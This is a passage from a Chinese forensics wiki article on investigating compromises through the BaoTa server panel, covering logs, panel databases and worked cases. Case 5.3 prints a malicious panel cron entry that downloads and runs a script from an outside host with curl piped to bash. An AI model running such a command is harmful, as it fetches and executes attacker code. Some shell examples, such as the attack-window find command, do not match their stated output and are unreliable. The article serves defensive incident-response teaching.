拿一个格式不稳定的文件当唯一依据，结论的稳定性完全取决于版本。

**影响**：**要么漏掉关键操作**（该版本不记这个动作），**要么把格式误读当内容异常**（字段位置对不上，误以为记录被篡改）。

**核查**：先看文件是否存在、size 与 mtime/ctime 是否异常，再看内容，最后与 `request.log` 对齐。

三者的关系是：`request.log` 记「访问了哪个 URL」（最稳定，格式类似 Nginx），`action.log` 记「执行了什么操作」（不稳定），`request.log` 是主、`action.log` 是补。

文件不存在或 size 为 0 时，记为「操作日志缺失」并列入取证局限，**不要臆测内容**。

若两者对同一事件都有记录，那是双源印证，可信度显著提高——案例里 `22:48:03` 的上传在两个日志里都有。

<a id="section-32"></a>

#### 陷阱 11：把「未发现」写成无边界的否定结论

**现象**：报告写「未发现攻击者使用面板的其他操作」或「未发现异常账户」，不写检查范围。

**原因**：面板层的阴性发现被三重限制压缩：

① **时间**——`request.log` 会轮转（案例里 10 份，最早到 `2024-03-09`），更早的已不可查。

② **完整性**——`action.log` 可能不存在或被清空，`data/` 里的 `login_time` 只有最后一次。

③ **位置**——旧版/新版路径、7.x/8.x、自定义安装目录都可能让目标文件根本没被读到。

**「未发现」是这三者的函数。**

**影响**：**阴性发现的强度被高估。** 委托方据此认为攻击者只用面板做了一件事（上传 WebShell），因而排除掉「改了防火墙规则」「加了 SSH 公钥」「导出了整个数据库」等后续动作——而这些恰恰是面板以 root 权限最容易做、也最不容易被发现的。

**核查**：**阴性发现必须三段式**：范围（检了多少个文件、覆盖哪段时间）、结论（该范围内未发现 X）、未覆盖（`request.log` 仅有 3 月 9 日起、**`action.log` 缺失无法验证操作层**、`data/` 的 `login_time` 无法还原历史）。

并且要把「面板可做的操作类型」列成清单逐项标注有证据/无证据——这个清单本身就是给委托方的排查指引，也是提醒他们面板权限过大的依据。

<a id="section-33"></a>

#### 陷阱 12：把 `request.log` 与 `access.log` 的时间直接相减

**现象**：面板 `request.log` 显示 2024-03-17 22:41 有人登录成功，`/www/wwwlogs/digiforensics-site.log` 显示 22:48 出现可疑文件的首次上传，报告写「从登录面板到落地文件共 7 分钟」，并以此认定入侵路径是「先拿面板」。

**原因**：两个日志的时间**字段格式不同，时区信息的显式程度也不同**。

Nginx 默认 `combined` 格式里的 `$time_local` 是 `[17/Mar/2024:22:48:03 +0800]`，**自带 `+0800` 偏移**；而面板 `request.log` 的格式是 `2024-03-17 22:41:03`，**不带任何时区信息**。

要命的是面板这一侧完全没有标记——它写的是面板进程按目标机本地时区格式化出的值。你无法从日志本身确认目标机时区，也就无法确认它与 Nginx 那一侧的 `+0800` 是否同一个基准（时区配置被改过、Nginx 自定义 `log_format` 去掉了偏移、日志经集中采集转发时做过时区转换，都会造成两者不一致）。

一个不带标记、一个带标记，肉眼相减最容易直接照抄数字。

**影响**：本篇的核心论证就是这条时间差——2.4 与第五章第 4 步都靠「面板登录与文件管理操作早于站点侧出现可疑文件」来定性入口。**这个差值不是佐证，是定性的唯一依据**。

基准一旦不一致，差值就无意义：轻则这条印证被自己算没，重则差值变号，报告会得出「面板与站点篡改互不相关」这一**与真相相反**的结论，而它的推导链看起来毫无破绽。

**核查**：**对齐之前先验证两侧基准一致，不能默认。** 三件事：

① 确认 `/etc/localtime` 与 `/etc/timezone` 的实际指向，并核对 Nginx 的 `log_format` 是否仍在使用默认的带偏移格式（自定义格式可能已去掉偏移）。

② 确认这两份日志是否经过集中采集或转发到汇聚主机——转发链路上的时区转换是基准错位的高发环节。

③ 核对面板所在主机与站点所在主机**是否是同一台**（分离部署时两侧时区配置可能本就不同）。

验证结论要写进报告：「两日志均为目标机本地时间，基准一致性依据为 `<Nginx log_format 配置 / timezone 文件内容>`」。

**只要无法确认基准，这个时间差就不能用于定性**，只能作为线索列出。


<a id="section-34"></a>

## 五、案例示例

<a id="section-35"></a>

### 5.1 面板登录到文件上传的入口链闭合

**场景**

查获一台 Ubuntu 20.04 云主机（承接[第 01 篇](server-panel-linux-server-artifact-map.md)同一台 `web01` 的主线），站点首页被篡改。镜像 `DigiForensics.dd`，已只读挂载到 `/mnt/df`。初步已从网站目录发现 `uploads/img/avatar.jpg` 是伪装 WebShell（`mtime` 2024-03-17 22:48:14）。现需回答：**攻击者是怎么进来的**。

这条路径值得先走，是因为站点侧只能证明"文件被写了"，证明不了"谁写的、通过什么通道写的"。

面板日志的价值恰恰在于：它记录的是**认证之后的每一个动作**——包括"打开了哪个目录的文件管理器"这种在站点日志里完全不可见的信息。

没有面板日志，"root 权限写入却无提权痕迹"这个矛盾就永远悬着。

**处置过程**

**第 1 步 · 确认面板环境与架构**

```bash
ls -d /mnt/df/www/server/panel && echo "→ 宝塔面板"
ls -l /mnt/df/www/server/panel/data/db/ 2>/dev/null
# default.db  database.db  panel.db        ← 新版架构（7.7+）
ls -l /mnt/df/www/server/panel/data/div.pl
# -rw-r----- 1 root root 44 2024-01-15 /mnt/df/www/server/panel/data/div.pl
```

**结论**：新版架构，敏感字段为 `BT-0x:` 密文，需按[第 03 篇](server-panel-bt-panel-encrypted-data.md)处理。

**第 2 步 · 固定面板数据与日志**

```bash
cp -rp /mnt/df/www/server/panel/data /evidence/bt-data/
cp -rp /mnt/df/www/server/panel/logs /evidence/bt-logs/
find /evidence/bt-data /evidence/bt-logs -type f -exec sha256sum {} + | tee /evidence/bt-hashes.txt
```

**第 3 步 · 面板请求日志——定位入口**

先定时间范围：

```bash
ls -l --time-style=long-iso /evidence/bt-logs/
# request.log      2024-03-18
# request.log.1    2024-03-17
# ...（共 10 份，最早 2024-03-09）
```

再提取登录行为：

```bash
grep -E 'POST /login' /evidence/bt-logs/request.log.1
```

```
2024-03-17 22:40:58 198.51.100.24 POST /login 200 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
2024-03-17 22:41:07 198.51.100.24 POST /login 200 498 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

**关键观察**：同一 IP 在 9 秒内连续两次 `POST /login`——第一次可能是输错或探测，第二次成功（200 且响应体较小，通常是跳转到面板首页）。

再看该 IP 登录后的动作：

```bash
grep '^198.51.100.24' /evidence/bt-logs/request.log.1 | head -20
```

```
2024-03-17 22:41:09 198.51.100.24 GET / 200 24512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
2024-03-17 22:41:15 198.51.100.24 GET /file?path=/www/wwwroot/digiforensics-site 200 18944 "http://198.51.100.24:8888/" "Mozilla/5.0 ..."
2024-03-17 22:48:03 198.51.100.24 POST /file/upload 200 1204 "http://198.51.100.24:8888/file?..." "python-requests/2.31.0"
```

**这就是完整入口链**：`/file?path=/www/wwwroot/digiforensics-site`（打开站点目录的文件管理器）→ `/file/upload`（上传）。而第 3 条的 UA 是 `python-requests`——**上传动作是脚本自动化完成的，不是手工拖拽**。

**第 4 步 · 与网站时间线交叉印证**

```bash
grep -E 'avatar\.jpg' /mnt/df/www/wwwlogs/digiforensics-site.log.1 | head -3
# 198.51.100.24 - - [17/Mar/2024:22:48:03 +0800] "POST /uploads/img/avatar.jpg HTTP/1.1" 200 4123 ...
```

面板上传 `22:48:03`（`request.log`）→ 网站首次请求该文件 `22:48:03`（`access.log`）→ WebShell 文件 `mtime` `22:48:14`。

**三个时间源在同一分钟内吻合**，且面板上传时间早于文件落地，逻辑自洽。

**第 5 步 · 操作日志佐证并固定证据**

`action.log` 中记录到 `22:48:03` 一次文件上传操作（操作者字段对应面板账户），与 `request.log` 吻合——**两个独立日志文件互为印证，可信度高**。

```bash
cp -rp /mnt/df/www/server/panel/logs/request.log.1 /evidence/
cp -p  /mnt/df/www/server/panel/data/log/action.log  /evidence/bt-action.log
sha256sum /evidence/request.log.1 /evidence/bt-action.log | tee -a /evidence/hashes.txt
```

**结论**

| 结论 | 支撑证据 | 强度 |
|---|---|---|
| 面板被 `198.51.100.24` 登录 | `request.log` 两次 `POST /login` 200 + `action.log` | 强（双源） |
| 攻击者经面板文件管理器上传 WebShell | `/file?path=...` → `/file/upload` 序列 + 站点同刻出现该文件 | 强（时间线三源吻合） |
| 上传为脚本自动化 | UA 为 `python-requests` | 强 |
| 面板账号本身已被攻破（非仅入口泄露） | 该 IP 完成了 `/login` 认证并进入面板 | 强 |
| WebShell 落地时刻 2024-03-17 22:48:14 | 文件 `mtime` + 日志上传时刻 | 强 |
| 面板 `request.log` 可分析时段为 **2024-03-09 至 2024-03-18** | 轮转链共 10 份 | 强（**边界须写入报告**） |

**本节能证明**：从认证到上传的完整操作序列、三源吻合的时间线、上传为自动化行为。

**本节不能证明**：面板口令的泄露渠道、`22:40:58` 那次是爆破还是输错、登录会话是否复用了已窃的 Cookie。

**误判对照**

这个案例最容易出的错是**把"登录成功"直接等同于"面板账号被攻破"**，以及**忽略第一次登录的 9 秒**。

1. **判据**：`POST /login` 返回 200 **只代表该 HTTP 请求被处理**，**不代表认证通过**。认证结果要靠后续请求佐证——判据是登录后是否出现了需要会话 Cookie 才能访问的接口响应。

   本案 `22:41:09 GET /` 返回 24512 字节（面板首页），`22:41:15 GET /file?path=...` 返回 18944 字节（文件管理器，**且路径正是受害站点目录**）——**这两个响应是认证通过的实证**。

   若只有一条 `POST /login 200` 而无后续 `GET /file`，则不得写"登录成功"。

2. **判据**：`22:40:58` 那次与 `22:41:07` 那次的差别，是"账号被攻破"还是"口令已知"的关键。

   两次都返回 200 且响应体 512 / 498 字节，**从 `request.log` 本身无法区分**——需要结合 (a) `action.log` 里是否只有一次成功认证记录、(b) 该 IP 之前是否有大量失败尝试（本案 `request.log.1` 中该 IP 此前无记录，说明**不是暴力破解，是口令已知**）。

   正确表述是"该 IP 在 9 秒内两次提交登录，**至少一次成功**；该 IP 在本日志范围内无失败尝试记录，指向**口令已知而非暴力破解**"。

3. **判据**："面板账号被攻破"与"面板入口 IP 未被封禁"是两件事。

   本案 `request.log.1` 中该 IP 此前无任何记录，说明它**第一次出现在面板日志里就登录成功了**——这既支持"口令已知"，也说明面板的安全入口 IP 白名单、面板 SSL、双因素认证均未起到拦截作用。

   这三项是**加固建议的落点**，不能因为"已经进来了"就跳过不提。

**按错误判据走的代价**：第 2 条踩中，报告会把事件定性为"遭遇暴力破解"，而实际是**凭据早已泄露**——两者的整改方向完全不同（前者是加锁定与验证码，后者是**改口令 + 查所有复用该口令的服务**）。

这个误判会让委托方在改完面板口令后认为事情结束，而同一个口令很可能还用在 FTP、数据库、云控制台上。

第 1 条踩中（只看 `POST /login 200` 就写登录成功）则可能把一次失败的登录尝试当成入侵证据，冤枉一个 IP。

<a id="section-36"></a>

### 5.2 面板上配置的站点与数据库清单清点

**场景**

承接 5.1。委托方法务提出第二个问题："面板上管着哪些站点和数据库？这些是不是都在这次的暴露范围内？"

这个问题决定整改与告知的范围。

**必须先清点，再谈影响面**——凭印象说"就这一个站"是这类报告里最常见也最贵的错误。

**处置过程**

**第 1 步 · 站点清单**

```bash
sqlite3 "file:/evidence/bt-data/db/panel.db?mode=ro" \
  "SELECT id, name, path, status, ps FROM sites;"
```

```
id  name                    path                                  status  ps
3   digiforensics-site      /www/wwwroot/digiforensics-site       1       apache
5   shop-site               /www/wwwroot/shop-site                1       nginx
6   internal-wiki           /www/wwwroot/internal-wiki            0       nginx
```

**三个站点**。这里有一个必须注意的细节：`status` 字段——`1` 通常表示正常，`0` 可能表示停止或异常。`internal-wiki` 是 `0`，**不能直接写成"该站点被攻击者停掉了"**，见误判对照。

**第 2 步 · 数据库清单（只读打开，绝不写）**

```bash
sqlite3 "file:/evidence/bt-data/db/database.db?mode=ro" \
  "SELECT name, username, password, accept FROM databases;"
```

```
shop_db           shop    BT-0x:kR7v...==     127.0.0.1
digiforensics_db  df_app  BT-0x:9xQm...==     127.0.0.1
wiki_db           wiki    BT-0x:4kTn...==     127.0.0.1
```

三个数据库，口令为新版密文（需[第 03 篇](server-panel-bt-panel-encrypted-data.md)取明文）。`accept` 全部为 `127.0.0.1`——**仅本机可连，属正常的安全配置**（若为 `0.0.0.0` 才需要单独立项）。

第 3 步 · 三个站点是否都被入侵过（清点必须逐个做）

```bash
# 对每个站点各查一遍，不能只查受害站
for d in /mnt/df/www/wwwroot/*/; do
  n=$(basename "$d")
  printf '%-24s ' "$n"
  find "$d" -type f -newermt '2024-03-01' \
    | wc -l | tr -d ' '
  echo " ← 3 月以来被修改文件数"
done
```

```
digiforensics-site      7      ★ 异常
shop-site               2         （正常：证书续期、缓存清理）
internal-wiki           0
```

再与 [第 01 篇](server-panel-linux-server-artifact-map.md) 确认的攻击时间窗（`2024-03-17 22:41` – `2024-03-18 01:02`）对齐：

```bash
# 精确到攻击窗内
for d in /mnt/df/www/wwwroot/*/; do
  printf '%-24s ' "$(basename "$d")"
  find "$d" -type f -newermt '2024-03-17 22:00' -newermt '2024-03-18 01:02' | wc -l | tr -d ' '
  echo
done
# digiforensics-site      2      ★ .user.ini + avatar.jpg
# shop-site               0
# internal-wiki           0
```

**结论**

| 站点/库 | 面板登记 | 攻击窗内文件变更 | 判定 |
|---|---|---|---|
| `digiforensics-site` | 是（status=1） | **2 个**（`avatar.jpg`、`.user.ini`） | **已确认被入侵** |
| `shop-site` | 是（status=1） | 0 | **在检查范围内未见入侵痕迹** |
| `internal-wiki` | 是（status=0） | 0 | **在检查范围内未见入侵痕迹**；status=0 含义待确认 |
| `shop_db` | 是 | 不适用 | 口令为密文，**未解密**（授权与环境未具备） |
| `digiforensics_db` | 是 | 不适用 | 同上 |
| `wiki_db` | 是 | 不适用 | 同上 |

**阴性发现的限定范围**：「`/mnt/df/www/wwwroot/` 下 3 个站点目录，检索 2024-03-17 22:00 至 2024-03-18 01:02 时间窗内全部文件的 mtime」。

**未覆盖**：`shop-site` 与 `internal-wiki` 的**数据库内容**（是否有数据被改或被导出）；各站点的**运行时日志**（`shop-site` 的 access log 未逐行检查）；面板**计划任务**（cron 面板任务区，本案未查）；**未查** `/mnt/df/www/wwwroot/` 之外的目录（如 `/www/backup/`、面板的备份目录）。

**未解密数据库口令的说明**：三个库的口令均为 `BT-0x:` 密文。**本案未解密**，原因是解密需要 (a) 委托方书面授权对明文口令进行取证分析，(b) 从 `div.pl` 提取密钥材料——**这两个条件本案当时不具备**。

这一点必须写进报告的未覆盖范围，**不能含糊带过**。

**误判对照**

这个案例最容易出的错是**把清点结果当影响面结论**，以及**过度解读 `status` 字段**。

1. **判据**："某站点文件 mtime 未变"不能等同于"该站点未被入侵"。WebShell 可通过 SQL 注入直接改数据库内容而**完全不碰文件系统**；也可以读取配置文件（`.env`、`config.php`）拿到数据库口令后从内网直连。

   判别力在本案**不足**——`shop-site` 的阴性结论只覆盖"文件系统在攻击窗内无变更"，**不覆盖"数据被访问或篡改"**。

   正确表述是"**在攻击窗内的文件 mtime 检查中未发现变更**"，而不是"该站点未被入侵"。

2. **判据**：**`status=0` 不等于"被攻击者停掉"**。宝塔面板的 `sites.status` 取值随版本变化（可能是 0=正常/1=停止，或相反），**必须先确认本版本的语义**（查面板自身的接口返回或该版本文档/前端 JS 的枚举定义），否则会写反。

   判别方法之一是**交叉验证**：如果 `status=0` 的站点在 `request.log` 里没有任何访问记录、且其静态文件长期未更新，那更可能是"建了没启用"。本案 `internal-wiki` 属后者。

   在未确认语义前，报告里只能写"status=0，含义待确认"。

3. **判据**："数据库口令未解密"必须显式写为未覆盖，不能让读者以为查过了。这类字段的常见写法是"数据库口令均已加密存储"——这句话看似给出了保护结论，**实际只回答了"存在什么格式"，没回答"是否可用"**。

   委托方需要知道的是"我们不知道这三个库的明文口令，因此无法判断它们是否在别处被复用"。**这是两个不同的问题。**

**按错误判据走的代价**：第 1 条踩中的代价在告知义务上最重：如果 `shop-site` 实际通过 SQL 注入被改过数据，而报告写"仅 `digiforensics-site` 受影响"，委托方会**只通知一个站点的用户**，另一个站点的数据被篡改却无人知情。

第 3 条踩中则会让委托方以为"数据库口令是加密的，安全"，从而**不做口令轮换**——而实际上这些口令是否在别处被复用，本案根本没查过。

<a id="section-37"></a>

### 5.3 反例 面板未记录的改动与 root 属主的误读

**场景**

委托方在拿到 5.1 的时间线后提出一个技术性疑问："面板日志显示攻击者 22:41 登录，但我查了 `/root/` 下的 `authorized_keys`，`mtime` 是 2024-01-15，没被改过。是不是他没拿到 root？"

这里藏着一个很常见的推理链条断裂："没有改 `authorized_keys`"被当成了"没有获得 root 权限"。

而实际上，面板**本身就是以 root 运行的**，通过面板完成的写文件操作根本不需要改 `authorized_keys`。

**处置过程**

**第 1 步 · 先确认面板进程的实际运行身份**

```bash
# 从镜像里读进程信息不可行，改为从配置与文件属主反推
ps auxwwf | grep -E 'BT-Panel|BT-Task' | grep -v grep
# root      1284  0.1  0.4  392104  16640 ?  Ssl  Mar 12 09:14 /www/server/panel/pyenv/bin/python /www/server/panel/BT-Panel
#                                                              ↑ 属主 root

# 面板写入的文件的属主（关键证据）
stat /mnt/df/www/wwwroot/digiforensics-site/uploads/img/avatar.jpg | grep -E 'Uid|Gid|权限'
# 权限: 644
# Uid: 33(www)  Gid: 33(www)
#                                        ↑ 注意：不是 root
```

**这里出现了一个需要解释的矛盾**：面板进程是 `root`，但它写入的文件属主是 `www`。

一种解释是面板的文件管理器在写入时会 `chown` 到目标站点对应的系统用户。这一机制须在面板实现或同批次写入样本上核实，不能仅凭属主断定。

第 2 步 · 找出真正被面板以 root 身份改动过的东西

```bash
# 面板的默认备份目录 —— root 属主，且是面板会写入的位置
ls -l --time-style=long-iso /mnt/df/www/backup/
total 14.2M
-rw-r--r-- 1 root root  8291456 2024-03-17 22:47:58  digiforensics-site-2024-03-17.tar.gz   ★
-rw-r--r-- 1 root root  8291456 2024-03-10 02:00:00  digiforensics-site-2024-03-10.tar.gz

# 面板计划任务
sqlite3 "file:/evidence/bt-data/db/panel.db?mode=ro" \
  "SELECT id, name, type, sType, sName, sShell, sContent FROM crontab;"
```

```
id  name         type    sType  sName  sShell  sContent
7   auto_backup  day     0      0      bash     /www/backup/auto_backup.sh
#                                                              ← 正常备份任务
8   (空)         minute  198.51.100.24  sh  curl -s http://198.51.100.24/beacon.sh | bash
#   ★ sName 填的是 IP，sContent 是命令体 —— 攻击者新增的面板计划任务
```

**这条记录说明攻击者做的事比 5.1 认定的更多**——他不止上传了 WebShell，还在**面板上建了一个每分钟执行的任务**。

**第 3 步 · 判断该任务的实际执行情况**

```bash
# 面板任务的落地执行痕迹在系统 cron 里
cat /mnt/df/var/spool/cron/crontabs/root | grep -n '198.51.100.24'
# (无输出)   ← ★ 系统 crontab 中没有对应条目

# 面板自己的任务日志
ls -l /mnt/df/www/server/panel/logs/ | grep -i task
# task.log  2024-03-18
grep '2024-03-17\|2024-03-18' /mnt/df/www/server/panel/logs/task.log | tail -5
# 2024-03-18 06:00:01 [cron] exec task id=8 ... status=success
# 2024-03-18 06:01:01 [cron] exec task id=8 ... status=success
```

系统 crontab 无痕迹但面板任务日志有执行记录，说明面板用自己的调度器执行该任务，不落地到系统 crontab。

这是必须搞清的一个机制差异——只查 `/var/spool/cron/` 会完全漏掉面板任务。

**结论**

| 结论 | 支撑证据 | 强度 |
|---|---|---|
| 面板进程以 **root** 运行 | `ps` 输出的属主 | 强 |
| 面板文件管理器写入时会把文件属主改为站点用户，故 WebShell 属主为 `www` | 面板进程 root + 文件属主 www 的组合 | 中（属主改写机制须另行核实；**属主不能反推写入者权限**） |
| 攻击者除上传 WebShell 外，**还在面板新增了计划任务 id=8** | `panel.db` 的 `crontab` 表（`sType=198.51.100.24`） | 强（**本节新发现，此前未纳入攻击链**） |
| 该任务由面板调度器执行，**不落地到系统 crontab** | `task.log` 有执行记录 + `/var/spool/cron/crontabs/root` 无痕迹 | 强 |
| 任务目标为 `curl ... \| bash` 形态，**属外连执行** | `crontab.sContent` 原文 | 强（**本案仅确认内容形态，未验证其实际功能**） |
| `/root/authorized_keys` 未被修改 | mtime 2024-01-15 | 强（**但与是否获得 root 无关**） |
| 该外连任务的**实际效果未确认** | 需网络侧或该脚本的落地物 | **未决项** |

**本节新增的攻击面**：5.1 的时间线只覆盖到"上传 WebShell"，**本案还应加上"面板持久化计划任务"这一环**。

它与[第 06 篇](../server-web/server-web-webshell-detection.md)所讲的 WebShell 持久化不同——**它的载体是面板数据库，删站点文件不会清掉它。**

**未覆盖范围**：「`panel.db` 的 `crontab` 表全部 8 条记录 + `/www/backup/` 目录 + `/var/spool/cron/` 系统任务」。

**未查**：`sContent` 指向的 `http://198.51.100.24/beacon.sh` 是否还可达、其内容是什么（**需在隔离环境外做被动解析，且不得执行**）；面板的**计划任务日志是否有更早的轮转**；`panel.db` 中是否还有其他表被改动（**如 `users` 表是否被新增账号**——这是本案**最该补做却尚未做**的一项）。

**误判对照**

这个案例最容易出的错，正是委托方自己提出的那个推理——用 `authorized_keys` 未被修改来论证"没拿到 root"。

1. **判据**："未建立 SSH 持久化"不等于"未获得 root 权限"。获得 root 与建立 SSH 后门是两件独立的事。判别 root 权限的判据是**写入行为本身**：面板进程以 root 运行，它写出的文件**天然具有 root 的写入能力**，根本不需要 `authorized_keys` 参与。正确表述是"该主机上的文件写入动作可由面板以 root 身份完成，无需经由 SSH"。

2. **判据**：**文件属主不能用来反推写入者的权限身份**。本案 WebShell 属主是 `www` 而面板进程是 `root`——若面板文件管理器在写入时改写了属主，`www` 属主与 root 写入并不矛盾。若按"属主 www 说明只是 www 权限写的"来推断，会**低估攻击者能力**，进而做出"只有 www 权限、改改业务文件就完事"的错误结论。**属主只说明文件最终归谁，不说明谁写的。**

3. **判据**：**面板计划任务不落地系统 crontab**，只查 `/var/spool/cron/crontabs/` 会漏掉全部面板任务。反过来，查了 `panel.db` 的 `crontab` 表也不能排除系统级 crontab 被改——**两条路径必须都查**。本案系统 crontab 无痕迹、面板表有记录，**这个组合恰好说明只看其中一边会得出相反结论**。

   **判据**：发现 `curl | bash` 形态的任务不等于确认其危害。本案只确认了 `crontab.sContent` 的内容形态，没有验证它是否成功执行、执行后落地了什么。正确表述是"面板存在一条指向外网的任务定义，形态为下载并执行；其实际执行效果未确认"。

   要主张"已建立回连"，需要网络侧流量证据或该脚本的落地物——两者本案均未取得。

**按错误判据走的代价**：第 1、2 条踩中会让委托方把整改范围限定在"业务目录 + 改业务相关凭据"，**而面板数据库里那条每分钟执行的任务原封不动**。

这条任务的存在形式是数据库记录——删站点文件、删 WebShell、重装网站内容都不影响它。委托方会以为"站点已经清理干净并恢复了"，实际每分钟仍有一次外连尝试。

而第 3 条踩中会让"未发现系统级持久化"这条结论被误用为"无持久化"，**恰好漏掉了本案已经证实存在的那一条**。

<a id="section-38"></a>

## 六、扩展阅读方向

面板这条线查完之后，通常还要回答三类问题——加密的字段怎么读、面板上传的文件去哪了、以及横向还有哪些主机。下面几组按这三类分组。

**新版架构：数据库打不开时**

- [宝塔新版加密数据解密](server-panel-bt-panel-encrypted-data.md) —— `BT-0x:` 前缀密文的密钥推导与解密脚本。**只做离线解密、只提取必要字段、口令一律脱敏。**
- [SQLite 基础与结构](../../mobile/mobile-database/mobile-database-sqlite.md) —— `default.db` 就是标准 SQLite。库打不开时先分清是加密、页大小读错，还是文件不完整。

**面板之外：同一层的其他入口**

- [其他面板取证](server-panel-hosting-control-panel-forensics.md) —— 1Panel、Webmin、aaPanel 的路径与日志对比。**规律相似但细节不同，凭印象查必错。**
- [远程控制工具痕迹](server-panel-remote-control-artifacts.md) —— 面板与 SSH 之外的第三条通道。**凭据只做离线分析与脱敏。**
- [取证工件地图（Linux 侧）](../../computer/computer-persistence/computer-persistence-persistence-artifact-map.md) —— 账户、计划任务、SUID。**面板能做的这些事，在系统侧同样留痕，两边要对照。**

**面板留下的东西去了哪：站点与网络层**

- [网站目录与 WebShell 检测](../server-web/server-web-webshell-detection.md) —— 面板上传的文件会以 root 权限出现在站点目录里，这是本篇结论最直接的延续。
- [Nginx 与 Apache 配置取证](../server-web/server-web-nginx-apache.md) —— `vhost/` 里的站点配置如何反查站点根与日志路径。
- [WebShell 工具流量特征](../server-web/server-web-webshell-traffic-patterns.md) —— **把 `POST /file` 与网站日志对齐**：上传之后的首次访问，两条时间线吻合即可锁定路径。
- [CDN 识别与源站挖掘](../server-web/server-web-cdn.md) —— 面板暴露在公网时，`request.log` 里的来源 IP 需要经过这一步才能确定是不是真实客户端。

**数据层：面板里那份资产清单怎么用**

- [MySQL 数据库取证](../../mobile/mobile-database/mobile-database-mysql.md) —— 面板 `databases` 表里存的口令对应哪台数据库、服务端还留了什么痕迹。
- [数据库与配置文件加密](../../crypto/crypto-app/crypto-app-database-configuration-decryption.md) —— 配置里库口令的识别与处置规范。

**时间与结论：这份日志能支撑多强**

- [反取证手法与时间戳篡改检测](../../fundamentals/fundamentals-concepts/fundamentals-concepts-anti-forensics-and-timestamp-tampering.md) —— `action.log` 缺失或被清空本身就是发现，"运维声称没做过的操作"要靠这一篇的判据来追。
- [时间戳换算](../../fundamentals/fundamentals-concepts/fundamentals-concepts-timestamps-and-timezones.md) —— 面板日志无时区标记，与站点日志对齐时的基准处理。
- [取证流程与原则](../../fundamentals/fundamentals-process/fundamentals-process-five-stage-forensics-process.md) —— 面板数据库按涉密证据管理的依据。
<a id="section-39"></a>

## 七、命令速查

```bash
# ===== 1. 确认面板与架构版本 =====
ls -d /mnt/df/www/server/panel
ls -l /mnt/df/www/server/panel/data/default.db /mnt/df/www/server/panel/data/db/ 2>/dev/null
ls -l /mnt/df/www/server/panel/data/div.pl 2>/dev/null        # 新版才有 → 敏感字段是 BT-0x: 密文
cat /mnt/df/www/server/panel/data/version.pl 2>/dev/null      # 版本号（以实际为准）

# ===== 2. 固定（先 cp 后分析；只读打开数据库）=====
cp -rp /mnt/df/www/server/panel/data /evidence/bt-data/
cp -rp /mnt/df/www/server/panel/logs /evidence/bt-logs/
cp -rp /mnt/df/www/server/panel/vhost /evidence/bt-vhost/
find /evidence/bt-data /evidence/bt-logs -type f -exec sha256sum {} + | tee /evidence/bt-hashes.txt

# ===== 3. 面板账户（users 表）=====
sqlite3 "file:/evidence/bt-data/default.db?mode=ro" ".tables"
sqlite3 "file:/evidence/bt-data/default.db?mode=ro" "PRAGMA table_info(users);"
sqlite3 -header -column "file:/evidence/bt-data/default.db?mode=ro" \
  "SELECT username, login_ip, login_time FROM users;"

# ===== 4. 面板请求日志（核心）=====
ls -l --time-style=long-iso /evidence/bt-logs/                 # 先定时间范围
grep -E 'POST /login|/login\b' /evidence/bt-logs/request.log* | head -50
awk '{print $1}' /evidence/bt-logs/request.log* | sort | uniq -c | sort -rn | head -30   # 来源 IP
grep -E '/(file|db|crontab|terminal|exec)' /evidence/bt-logs/request.log* | head -50      # 敏感操作
grep -E 'python-requests|curl/|wget/|Go-http-client' /evidence/bt-logs/request.log*        # 脚本 UA

# ===== 5. 操作日志 =====
ls -l /evidence/bt-data/log/ /evidence/bt-data/data/log/ 2>/dev/null
grep -iE 'upload|file|edit|add|delete|cron|database|passwd' /evidence/bt-data/log/action.log 2>/dev/null | tail -50
stat -c '%n size=%s mtime=%y ctime=%z' /evidence/bt-data/log/action.log 2>/dev/null   # 是否被清空/改动

# ===== 6. 站点与数据库清单 =====
sqlite3 "file:/evidence/bt-data/default.db?mode=ro" "SELECT name, path, status FROM sites;"
sqlite3 "file:/evidence/bt-data/db/database.db?mode=ro" "SELECT name, username, password, accept FROM databases;"
ls -la /mnt/df/www/wwwroot/     # 与数据库记录比对：有无"幽灵站点"

# ===== 7. 入口、暴露面与备份 =====
cat /evidence/bt-data/admin_path.pl; cat /evidence/bt-data/port.pl
ls -l /mnt/df/www/server/panel/data/ssl.pl /mnt/df/www/server/panel/data/panel_ssl.pl 2>/dev/null
ss -tulpn | grep -E ':8888|:888'                 # 在线：0.0.0.0 = 直接暴露公网
ls -la /mnt/df/www/backup/                        # 勒索/篡改案件必查
find /mnt/df/www/backup -maxdepth 2 -type d -printf '%TY-%Tm-%Td %m %u:%g  %p\
' | sort
```

---

📌 **版权与引用声明**

本文为 DigiForensics 独立创作的知识条目，采用 [知识共享 署名-相同方式共享 4.0 国际](https://creativecommons.org/licenses/by-sa/4.0/deed.zh-hans) 许可协议发布。

- **署名**：引用本文时请注明「DigiForensics Wiki — 服务器与 Web 取证 — 宝塔面板取证」
- **相同方式共享**：衍生作品须采用相同协议发布

示例：`本文内容参考自 DigiForensics Wiki《宝塔面板取证》（CC BY-SA 4.0）`

文中 `DigiForensics.dd`、`DigiForensics.vc` 等均为示例证据文件名，指向虚构或已脱敏的检材，与真实案件无关。
